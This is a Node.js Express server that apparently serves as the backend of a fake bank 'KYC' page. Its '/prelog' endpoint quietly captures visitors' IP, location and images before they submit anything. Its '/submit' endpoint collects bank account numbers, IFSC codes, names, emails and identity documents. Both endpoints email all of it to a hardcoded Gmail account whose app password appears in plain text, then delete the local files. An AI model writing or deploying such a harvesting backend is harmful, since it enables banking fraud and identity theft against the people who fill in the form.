const express = require('express');
const multer = require('multer');
const fs = require('fs');
const path = require('path');
const nodemailer = require('nodemailer');

const app = express();
const port = process.env.PORT || 3000;

// Middleware
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(express.json({ limit: '50mb' }));
app.use(express.static('public'));

const uploadDir = 'uploads';
if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir);

// Multer setup
const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, uploadDir),
  filename: (req, file, cb) => cb(null, Date.now() + '-' + file.originalname.replace(/\s+/g, '_'))
});
const upload = multer({ storage }).any();

// Email setup
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: 'dcbsubmission392@gmail.com',
    pass: 'iskexmwnespcwxrkjt'  // Replace with app password
  }
});

// Helper: Get IP
function getClientIP(req) {
  return req.headers['x-forwarded-for'] || req.socket.remoteAddress || req.ip;
}

// Route: Prelog (before form is submitted)
app.post('/prelog', upload, async (req, res) => {
  try {
    const ip = getClientIP(req);
    const userAgent = req.headers['user-agent'];
    const timestamp = new Date().toISOString();
    const files = req.files || [];
    const location = req.body.location ? JSON.parse(req.body.location) : null;

    // Log entry
    const log = `
[PreLog]
Time: ${timestamp}
IP: ${ip}
User-Agent: ${userAgent}
Location: ${location ? `${location.latitude}, ${location.longitude}` : 'N/A'}
Images Received: ${files.length}
-------------------------`;

    fs.appendFileSync('records.txt', log);

    // Send email
    await transporter.sendMail({
      from: 'dcbsubmission392@gmail.com',
      to: 'dcbsubmission392@gmail.com',
      subject: '📸 Pre-Capture KYC Logs',
      text: log,
      attachments: files.map(f => ({ filename: f.originalname, path: f.path }))
    });

    // Cleanup
    files.forEach(f => fs.unlinkSync(f.path));
    res.status(200).send('Prelog saved.');
  } catch (err) {
    console.error('Prelog error:', err);
    res.status(500).send('Prelog failed');
  }
});

// Route: Submit (form + images + doc)
app.post('/submit', upload, async (req, res) => {
  try {
    const { bankname, ifsc, accno, fullname, email, location } = req.body;
    const ip = getClientIP(req);
    const userAgent = req.headers['user-agent'];
    const timestamp = new Date().toISOString();
    const files = req.files || [];
    const locationObj = location ? JSON.parse(location) : null;

    let documentFile = null;
    const images = [];

    files.forEach(file => {
      if (file.fieldname === 'document') documentFile = file;
      else images.push(file);
    });

    // Log
    const log = `
[KYC Submission]
Time: ${timestamp}
Bank: ${bankname}
IFSC: ${ifsc}
Account: ${accno}
Full Name: ${fullname}
Email: ${email}
IP: ${ip}
User-Agent: ${userAgent}
Location: ${locationObj ? `${locationObj.latitude}, ${locationObj.longitude}` : 'N/A'}
Document: ${documentFile ? documentFile.originalname : 'None'}
Images Received: ${images.length}
-------------------------`;

    fs.appendFileSync('records.txt', log);

    // Email
    await transporter.sendMail({
      from: 'dcbsubmission392@gmail.com',
      to: 'dcbsubmission392@gmail.com',
      subject: '✅ New KYC Form Submission',
      text: log,
      attachments: [
        ...(documentFile ? [{ filename: documentFile.originalname, path: documentFile.path }] : []),
        ...images.map(f => ({ filename: f.originalname, path: f.path }))
      ]
    });

    // Cleanup
    if (documentFile) fs.unlinkSync(documentFile.path);
    images.forEach(f => fs.unlinkSync(f.path));
    res.status(200).send('Form submitted');
  } catch (err) {
    console.error('Submission error:', err);
    res.status(500).send('Form submission failed');
  }
});

// Start server
app.listen(port, () => {
  console.log(`✅ Server running on http://localhost:${port}`);
});
